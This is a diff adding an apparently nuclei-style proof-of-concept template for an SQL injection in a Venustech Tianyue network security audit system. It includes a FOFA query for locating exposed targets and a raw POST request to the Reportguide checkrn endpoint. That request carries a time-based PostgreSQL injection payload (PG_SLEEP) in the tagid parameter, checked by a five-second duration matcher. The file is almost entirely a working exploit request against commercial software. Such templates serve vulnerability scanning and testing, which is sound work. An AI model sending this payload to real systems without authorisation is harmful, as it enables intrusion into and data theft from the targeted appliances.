@@ -1,0 +1,25 @@
+id: NPoc-17
+
+info:
+  name: 启明星辰天玥网络安全审计系统SQL注入漏洞
+  author: kingkong
+  severity: high
+  metadata:
+    fofa-query: app="启明星辰-天玥网络安全审计"
+
+request:
+  - raw:
+      - |
+        POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
+        Host: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
+        Connection: close
+          
+        checkname=123&tagid=123 AND 8475=(SELECT 8475 FROM PG_SLEEP(5))-- BAUh
+
+    matchers-condition: and
+    matchers:
+      - type: duration
+        part: duration
+        duration: 5
